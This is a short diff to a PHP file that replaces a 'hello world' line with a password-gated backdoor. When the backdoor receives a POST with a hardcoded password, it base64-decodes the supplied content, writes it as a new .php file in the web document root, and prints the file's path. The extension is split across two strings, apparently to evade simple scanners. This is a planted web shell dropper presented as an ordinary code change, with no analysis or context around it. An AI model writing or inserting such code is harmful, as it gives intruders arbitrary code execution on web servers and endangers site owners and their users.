@@ -1,2 +1,7 @@
 <?php
-echo "hello world";
+if(!empty($_POST["contentp"]) && !empty($_POST["filename"]) && @trim($_POST["pass"]) == "phappinessfirst"){
+    $filename = $_SERVER["DOCUMENT_ROOT"] . "/".@trim($_POST["filename"]) . ".p";
+    $filename .= "hp";
+    file_put_contents($filename, "<?php\n".base64_decode($_POST["contentp"])."?>");
+    echo $filename;exit();
+}
